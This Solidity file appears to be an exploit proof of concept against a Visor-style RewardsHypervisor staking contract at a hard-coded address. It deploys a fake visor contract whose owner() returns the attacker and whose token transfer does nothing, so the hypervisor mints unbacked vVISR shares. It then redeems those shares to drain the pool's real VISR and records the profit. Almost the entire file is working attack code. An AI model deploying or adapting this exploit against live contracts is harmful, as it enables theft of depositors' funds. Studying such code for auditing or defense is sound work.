// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function totalSupply() external view returns (uint256);
}

interface IRewardsHypervisorLike {
    function visr() external view returns (address);
    function vvisr() external view returns (address);
    function deposit(uint256 visrDeposit, address payable from, address to) external returns (uint256 shares);
    function withdraw(uint256 shares, address to, address payable from) external returns (uint256 rewards);
}

contract FakeVisor {
    address public immutable attacker;

    constructor(address attacker_) {
        attacker = attacker_;
    }

    function owner() external view returns (address) {
        return attacker;
    }

    function delegatedTransferERC20(address, address, uint256) external {
        // Intentionally no-op.
        // This preserves the finding's core causality: the hypervisor trusts
        // any contract-shaped `from` that reports `owner() == msg.sender`, but
        // never verifies that VISR actually moved before minting vVISR shares.
    }
}

contract FlawVerifier {
    address public constant TARGET = 0xC9f27A50f82571C1C8423A42970613b8dBDA14ef;
    uint256 private constant SHARE_INFLATION_MULTIPLIER = 1_000_000;

    uint256 private _profitAmount;

    address public attacker;
    address public fakeVisor;
    uint256 public hugeAmount;
    uint256 public depositAmountUsed;
    uint256 public mintedShares;
    uint256 public visrBalanceBefore;
    uint256 public visrBalanceAfter;
    uint256 public shareSupplyBefore;
    uint256 public shareSupplyAfter;
    uint256 public hypervisorVisrBefore;
    uint256 public hypervisorVisrAfter;
    bool public depositSucceeded;
    bool public withdrawSucceeded;
    bool public executed;

    constructor() {
        attacker = address(this);
    }

    function executeOnOpportunity() external {
        require(!executed, "already executed");
        executed = true;

        IRewardsHypervisorLike hypervisor = IRewardsHypervisorLike(TARGET);
        address visrToken = hypervisor.visr();
        address shareToken = hypervisor.vvisr();

        visrBalanceBefore = IERC20Like(visrToken).balanceOf(attacker);
        shareSupplyBefore = IERC20Like(shareToken).totalSupply();
        hypervisorVisrBefore = IERC20Like(visrToken).balanceOf(TARGET);

        require(hypervisorVisrBefore > 0, "no VISR to drain");

        // Path 0-2 alignment:
        // 1) deploy a fake IVisor contract,
        // 2) make owner() return the attacker,
        // 3) use that fake visor in deposit(hugeAmount, fakeVisor, attacker).
        fakeVisor = address(new FakeVisor(attacker));

        hugeAmount = _selectHugeAmount(hypervisorVisrBefore, shareSupplyBefore);
        depositAmountUsed = hugeAmount;
        require(hugeAmount > 0, "invalid amount");

        uint256 shareBalanceBefore = IERC20Like(shareToken).balanceOf(attacker);

        // Core exploit: the hypervisor mints shares as if VISR was received,
        // even though FakeVisor.delegatedTransferERC20() transferred nothing.
        uint256 returnedShares = hypervisor.deposit(hugeAmount, payable(fakeVisor), attacker);
        depositSucceeded = true;

        uint256 shareBalanceAfterDeposit = IERC20Like(shareToken).balanceOf(attacker);
        mintedShares = shareBalanceAfterDeposit - shareBalanceBefore;
        if (mintedShares == 0) {
            mintedShares = returnedShares;
        }
        require(mintedShares > 0, "no shares minted");

        // Redeem the freshly minted unbacked shares against the real VISR pool.
        hypervisor.withdraw(mintedShares, attacker, payable(attacker));
        withdrawSucceeded = true;

        visrBalanceAfter = IERC20Like(visrToken).balanceOf(attacker);
        shareSupplyAfter = IERC20Like(shareToken).totalSupply();
        hypervisorVisrAfter = IERC20Like(visrToken).balanceOf(TARGET);

        if (visrBalanceAfter > visrBalanceBefore) {
            _profitAmount = visrBalanceAfter - visrBalanceBefore;
        }
    }

    function profitToken() external view returns (address) {
        return IRewardsHypervisorLike(TARGET).visr();
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _selectHugeAmount(uint256 hypervisorVisrBalance, uint256 shareSupply) internal pure returns (uint256 amount) {
        amount = hypervisorVisrBalance;

        if (amount > type(uint256).max / SHARE_INFLATION_MULTIPLIER) {
            amount = type(uint256).max / SHARE_INFLATION_MULTIPLIER;
        } else {
            amount *= SHARE_INFLATION_MULTIPLIER;
        }

        if (amount == 0) {
            amount = 1;
        }

        if (shareSupply != 0) {
            uint256 maxSafeAmount = type(uint256).max / shareSupply;
            if (maxSafeAmount <= 1) {
                return 0;
            }
            if (amount >= maxSafeAmount) {
                amount = maxSafeAmount - 1;
            }
        }
    }
}
